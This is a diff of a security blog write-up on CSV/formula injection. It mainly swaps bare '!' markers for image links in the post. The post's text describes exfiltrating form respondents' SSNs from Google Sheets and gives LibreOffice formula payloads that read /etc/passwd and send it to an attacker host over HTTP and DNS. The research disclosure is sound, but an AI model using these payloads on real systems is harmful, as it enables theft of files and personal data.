@@ -122,19 +122,19 @@ Based on Google documentation of its spreadsheet functions, the above mentioned 
 
 Google provide functionality to create forms and receive responses, which later can be accessed using Google sheets. We attempted to exploit this issue by submitting a malicious formula in the comments section of the respective Google form. However, Google was performing sanity checks on responses submitted and it automatically added an (‘) apostrophe before the formula, thus stopping the formula from executing.
 
-!**Scenario 2 [Success]:** Google sheets also gave some functionality that allows us to import data from different file formats like csv, tsv, xlsx etc. This imported data can be represented using a new spreadsheet or can be appended to an existing sheet. For our PoC we will be appending it to a sheet containing responses from the previous scenario, so that we can extract data submitted by other users. Fortunately for us Google did not perform the same the check it did in scenario 1. The following steps were used.
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/failed_1.png)**Scenario 2 [Success]:** Google sheets also gave some functionality that allows us to import data from different file formats like csv, tsv, xlsx etc. This imported data can be represented using a new spreadsheet or can be appended to an existing sheet. For our PoC we will be appending it to a sheet containing responses from the previous scenario, so that we can extract data submitted by other users. Fortunately for us Google did not perform the same the check it did in scenario 1. The following steps were used.
 
 1) We created a malicious csv file with a payload (formula), that will concatenate data from A to D columns. We then generate an out of band request for our attacker server with those details.
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/success_1.png)
 
 2) We then imported the csv file into Google Sheets using the import functionality, and appended the data to the existing sheet.
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/success_2.png)
 
 3) Once the data was imported our payload executed and we received the details of users like name, email and SSN data on a HTTP server listening on our attacking server.
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/success_3.png)
 
 This hopefully gives a snippet into what may be achieved. With this in mind we’ll continue this discussion, but now focus upon LibreOffice.
 
@@ -157,7 +157,7 @@ We first tried to read sensitive files via formulas using our local access. Libr
 ='file:///etc/passwd'#$passwd.A1
 ```
 
-!**Analyzing the above payload:**
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/local_etc_passwd.png)**Analyzing the above payload:**
 
 - 'file:///etc/passwd'#$passwd.A1 – Will read the 1st line from the local /etc/passwd file
 
@@ -165,15 +165,15 @@ We first tried to read sensitive files via formulas using our local access. Libr
 
 It should be noted that upon initial import the user will be prompted for an action as shown within the following screenshot (showing the output of /etc/group, in this instance).
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/import.png)
 
 After this import, the user is then prompted to update links whenever the document is reopened.
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/links.png)
 
 Incidentally, by altering the row reference (in this case A2), we could read further entries from the file.
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/local_etc_passwd_row2.png)
 
 This is all well and good, but we needed a way to see the file contents from a remote system (we won’t have the advantage of viewing these results within the LibreOffice application!)
 
@@ -187,7 +187,7 @@ Continuing with this theory we came up with the following PoC.
 =WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)))
 ```
 
-!**Analyzing the above payload:**
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/webservice_single_line_modified2.png)**Analyzing the above payload:**
 
 - 'file:///etc/passwd'#$passwd.A1 – Will read the 1st line from the local /etc/passwd file
 - CONCATENATE("http://<ip>:8080",('file:///etc/passwd'#$passwd.A1)) – Concatenate the IP address and output of ‘file’
@@ -195,11 +195,11 @@ Continuing with this theory we came up with the following PoC.
 
 Our attacking system had Python’s SimpleHTTPServer running, so when the malicious file is opened on the victim system, the requests were made and hence received by our server.
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/webservice_single_line_request_modified.png)
 
 Similarly, we created a couple of payloads to read multiple lines from a target file. If space isn’t an issue, this task can be easily achieved by embedding multiple rows within a single document by just ensuring that the last reference, i.e. #$passwd.A1 is set to increment with each row. The following PoC will extract and send the first 30 rows within the target file /etc/passwd.
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/webservice_multiple_modified.png)
 
 However, a cleaner way of achieving the same goal would be to reference multiple rows within a single formula as shown below.
 
@@ -211,7 +211,7 @@ On executing the below payload, 2 lines from /etc/passwd file are sent to the at
 =WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))
 ```
 
-!**Analyzing the above payload:**
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/webservice_multiline_modified-1.png)**Analyzing the above payload:**
 
 - 'file:///etc/passwd'#$passwd.AX – Will read the 1st and 2nd lines from the local /etc/passwd file
 - CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)) – Concatenate the attacking server IP address with the output of /etc/passwd lines rows 1 and 2 (the 1st 2 lines in the file), each being separated with the dollar($) character
@@ -219,7 +219,7 @@ On executing the below payload, 2 lines from /etc/passwd file are sent to the at
 
 Looking at the attacking host we can see the corresponding entries from /etc/passwd within the GET request, separated in this instance by the $ character (CHAR 36).
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/webservice_multiline_request_modified.png)
 
 Depending on the file contents we could be hitting issues with length here ([https://stackoverflow.com/questions/417142/what-is-the-maximum-length-of-a-url-in-different-browsers](https://stackoverflow.com/questions/417142/what-is-the-maximum-length-of-a-url-in-different-browsers)) and special characters may also play a part in a PoC failure.
 
@@ -231,7 +231,7 @@ We address both issues in the next PoC, and as no OOB data exfiltration would be
 =WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<FQDN>"))
 ```
 
-!**Analyzing the above payload:**
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/dns_payload.png)**Analyzing the above payload:**
 
 - 'file:///etc/passwd'#$passwd.A19 – Will read the 19th line from the local /etc/passwd file
 - ENCODEURL('file:///etc/passwd'#$passwd.A19) - URL encode the returned data
@@ -242,6 +242,6 @@ We address both issues in the next PoC, and as no OOB data exfiltration would be
 
 Upon sending this, we can see queries for the FQDN (which includes the encoded data from line 19 of /etc/passwd), via tcpdump on our server that is configured to be the authoritative server for the domain, as shown below.
 
-!
+![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2018/05/CSV-DNS-PoC.png)
 
 If you happen to be using, testing or tinkering with an application that offers upload/download/imports/exports of CSV data and the like, you may well be glad of simple wins such as displayed here.
